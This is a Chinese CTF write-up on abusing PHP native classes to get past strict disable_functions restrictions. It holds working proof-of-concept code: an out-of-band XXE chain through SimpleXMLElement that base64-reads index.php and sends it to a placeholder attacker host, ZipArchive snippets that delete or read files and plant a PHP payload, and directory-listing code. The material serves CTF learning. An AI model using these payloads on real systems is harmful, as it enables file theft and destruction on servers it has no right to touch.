---
title: 任意代码执行下的php原生类利用
tags:
  - disable_functions
  - php
---
# 任意代码执行下的php原生类利用
打ctf时有时候会遇到一些比较变态的disable_functions，把许多常见的函数都禁用了，导致我们无法写入文件/读取文件等，这里主要介绍在这种情况下一些php原生类的利用
一个disable_functions例子如下(从某道题目抠下来的):
```
zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, define, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strtolower, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, pathinfo, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, base64_decode, base64_encode, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, move_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_get_contents, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, frenchtojd, jddayofweek, jdmonthname, easter_date, easter_days, unixtojd, jdtounix, cal_to_jd, cal_from_jd, cal_days_in_month, cal_info, ctype_alnum, ctype_alpha, ctype_cntrl, ctype_digit, ctype_lower, ctype_graph, ctype_print, ctype_punct, ctype_space, ctype_upper, ctype_xdigit, dom_import_simplexml, exif_read_data, read_exif_data, exif_tagname, exif_thumbnail, exif_imagetype, finfo_open, finfo_close, finfo_set_flags, finfo_file, finfo_buffer, mime_content_type, ftp_connect, ftp_ssl_connect, ftp_login, ftp_pwd, ftp_cdup, ftp_chdir, ftp_exec, ftp_raw, ftp_mkdir, ftp_rmdir, ftp_chmod, ftp_alloc, ftp_nlist, ftp_rawlist, ftp_mlsd, ftp_systype, ftp_pasv, ftp_get, ftp_fget, ftp_put, ftp_append, ftp_fput, ftp_size, ftp_mdtm, ftp_rename, ftp_delete, ftp_site, ftp_close, ftp_set_option, ftp_get_option, ftp_nb_fget, ftp_nb_get, ftp_nb_continue, ftp_nb_put, ftp_nb_fput, ftp_quit, gd_info, imagearc, imageellipse, imagechar, imagecharup, imagecolorat, imagecolorallocate, imagepalettecopy, imagecreatefromstring, imagecolorclosest, imagecolorclosesthwb, imagecolordeallocate, imagecolorresolve, imagecolorexact, imagecolorset, imagecolortransparent, imagecolorstotal, imagecolorsforindex, imagecopy, imagecopymerge, imagecopymergegray, imagecopyresized, imagecreate, imagecreatetruecolor, imageistruecolor, imagetruecolortopalette, imagepalettetotruecolor, imagesetthickness, imagefilledarc, imagefilledellipse, imagealphablending, imagesavealpha, imagecolorallocatealpha, imagecolorresolvealpha, imagecolorclosestalpha, imagecolorexactalpha, imagecopyresampled, imagerotate, imageflip, imageantialias, imagecrop, imagecropauto, imagescale, imageaffine, imageaffinematrixconcat, imageaffinematrixget, imagesetinterpolation, imagesettile, imagesetbrush, imagesetstyle, imagecreatefrompng, imagecreatefromwebp, imagecreatefromgif, imagecreatefromjpeg, imagecreatefromwbmp, imagecreatefromxbm, imagecreatefromxpm, imagecreatefromgd, imagecreatefromgd2, imagecreatefromgd2part, imagecreatefrombmp, imagecreatefromtga, imagepng, imagewebp, imagegif, imagejpeg, imagewbmp, imagegd, imagegd2, imagebmp, imagedestroy, imagegammacorrect, imagefill, imagefilledpolygon, imagefilledrectangle, imagefilltoborder, imagefontwidth, imagefontheight, imageinterlace, imageline, imageloadfont, imagepolygon, imageopenpolygon, imagerectangle, imagesetpixel, imagestring, imagestringup, imagesx, imagesy, imagesetclip, imagegetclip, imagedashedline, imagettfbbox, imagettftext, imageftbbox, imagefttext, imagetypes, jpeg2wbmp, png2wbmp, image2wbmp, imagelayereffect, imagexbm, imagecolormatch, imagefilter, imageconvolution, imageresolution, textdomain, gettext, _, dgettext, dcgettext, bindtextdomain, ngettext, dngettext, dcngettext, bind_textdomain_codeset, gmp_init, gmp_import, gmp_export, gmp_intval, gmp_strval, gmp_add, gmp_sub, gmp_mul, gmp_div_qr, gmp_div_q, gmp_div_r, gmp_div, gmp_mod, gmp_divexact, gmp_neg, gmp_abs, gmp_fact, gmp_sqrt, gmp_sqrtrem, gmp_root, gmp_rootrem, gmp_pow, gmp_powm, gmp_perfect_square, gmp_perfect_power, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status,
```

 ## SimpleXMLElement
 利用版本: `(PHP 5, PHP 7)` 
 
 我们知道可以使用xxe来读取文件，那么我们是否可以通过手动构造一个xxe漏洞来读取文件呢？答案是肯定的，我们来看下官方文档:
 ![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211123105014.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211123105031.png)
可以看到当我们设置第三个参数为true时，可以从远程加载xml文档，那么第二个参数该如何设置呢？我们查看php的预定义常量
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211123105130.png)
可以看到这里存在警告，当我们设置第二个参数为`LIBXML_NOENT`时，可能会导致xxe攻击，这正是我们想要的。手动输出下该值，为2，所以我们也可以设置该参数为2:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211123105331.png)

### 读文件poc
evil.xml
```xml
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx/send.xml">  
%remote;  
%all;  
%send;  
]>
```
send.xml
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">  
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/send.php?file=%file;'>">
```
send.php
```php
<?php   
file_put_contents("result.txt", $_GET['file']) ;  
?>
```
恶意代码
```php
$x=new SimpleXMLElement("http://xxx.xxx.xxx.xxx/evil.xml",2,true);
```
当然我们不止可以读文件，xxe能干的事我们也能干

## ZipArchive
利用版本: `(PHP 5 >= 5.2.0, PHP 7, PECL zip >= 1.1.0)`

这个类是在php5.2.0之后引入的，我们之前会在一些原生类利用中见到它，我们可以用这个类来删除文件，读取文件以及有损写文件。

### 删除文件poc
```php
$a=new ZipArchive();
$a->open("file", ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替
```

### 读取文件poc
```php
$f = "flag";
$zip=new ZipArchive();
$zip->open("a.zip", ZipArchive::CREATE);
$zip->addFile($f);
$zip->close();
$zip->open("a.zip");
echo $zip->getFromName($f);
$zip->close();
```

### 有损写文件poc
用处不大
```php
$f = "flag";
$zip=new ZipArchive();
$zip->open("a.zip", ZipArchive::CREATE);
$zip->setArchiveComment("<?php phpinfo();?>");
$zip->addFromString("file", "");
$zip->close();
//include "a.zip";
```

## Phar
利用脚本: `(PHP 5 >= 5.3.0, PHP 7, PECL phar >= 2.0.0)`


## Directory
利用版本：`(PHP 4, PHP 5, PHP 7)`

这个类本意是不能够直接通过 `new` 方式进行创建利用，当使用 `dir` 函数时，这个类会被实例化。但我们依然可以直接实例化并使用其中的方法
### 判断目录是否存在poc
```php
# 判断某个目录是否存在，
# 如果存在返回目录字符串，若不存在则产生警告并返回NULL
$dir="/etc";
echo (new Directory)->read(opendir($dir)); 
```

### 列目录poc
```php
$dir = "/etc";
$d = new Directory;
$d->resource = opendir($dir);
while(($c = $d->read($d->resource))){echo $c."\n";};
```

## DirectoryIterator
利用版本：`(PHP 5, PHP 7)`

### poc
```php
# 简单列目录
$dir = "./geek";
$d = new DirectoryIterator($dir);
while ($d->valid()){
    echo $d."\n";
    $d->next();
}

# 也可以用来获取文件的信息
$dir = "./geek";
$d = new DirectoryIterator($dir);
while($d->valid()){
    
    # 获取最后访问时间
    var_dump($d->getATime());
    # 获取创建时间
    var_dump($d->getCTime());
    # 获取最后修改时间
    var_dump($d->getMtime());
    # 获取文件名，
    # 直接用 __toString 也可以
    var_dump($d->getFilename());
    var_dump((string)$d);
    # 获取文件名 (自动除去后缀名)，
    # 比如除去 .php 后缀名
    var_dump($d->getBasename("php"));
    # 获取目录和文件名
    var_dump($d->getPathname());
    # 获取文件所有者
    var_dump($d->getOwner());
    # 获取文件所有组
    var_dump($d->getGroup());
    # 获取文件inode编号
    var_dump($d->getInode());
    # 获取文件权限
    var_dump(substr(sprintf("%o",$d->getPerms()),-4));
    # 获取文件大小
    var_dump(($d->getSize()/1024)." kb");
    # 获取文件类型 (file/dir)
    var_dump($d->getType());
    # 判断文件是否是目录
    var_dump($d->isDir());
    # 判断文件是否是文件 (不是目录)
    var_dump($d->isFile());
    # 判断文件是否为 ./..
    var_dump($d->isDot());
    # 判断文件是否可执行
    var_dump($d->isExecute());
    # 判断文件是否是链接文件
    var_dump($d->isLink());
    # 判断文件是否可读
    var_dump($d->isReadable());
    # 判断文件是否可写
    var_dump($d->isWriteable());
    
    $d->next();
}

# 一些其他方法的功能
# 获取当前目录路径 (其实也就是 ? )
var_dump($d->path());
# 获取当前元素的索引
var_dump($d->key());
# 将当前索引移动到下一个元素
$d->next();
# 将索引重置到开头
$d->rewind();
# 设置索引
$d->seek(0);
# 判断当前索引的文件是否合法 (是否是一个文件)
$d->vaild();
```

## FilesystemIterator
利用版本：`(PHP 5 >= 5.3.0, PHP 7)`
